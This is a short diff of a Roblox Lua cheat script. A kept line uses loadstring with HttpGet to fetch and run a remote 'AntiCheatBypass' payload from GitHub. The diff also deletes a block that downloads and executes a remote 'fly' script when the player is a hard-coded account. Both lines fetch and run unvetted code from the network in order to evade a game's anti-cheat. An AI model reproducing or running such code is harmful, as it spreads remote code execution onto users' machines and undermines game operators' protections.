@@ -57,18 +57,6 @@ end
 loadstring(game:HttpGet("https://raw.githubusercontent.com/MsorkyScripts/OpenSourceAntiCheat/main/AntiCheatBypass.txt"))()
 getgenv().Executed = true
 
-local mainAccount = "floodsloll"  -- Replace with your main account's name
-
-local function executeOnMainAccount()
-    if game.Players.LocalPlayer.Name == mainAccount then
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/floodsupdatecheck/Update-check/main/fly"))()
-        getgenv().Executed = true
-    end
-end
-
-executeOnMainAccount()
-
-
 --// Code --//
 
 local Connections = {}
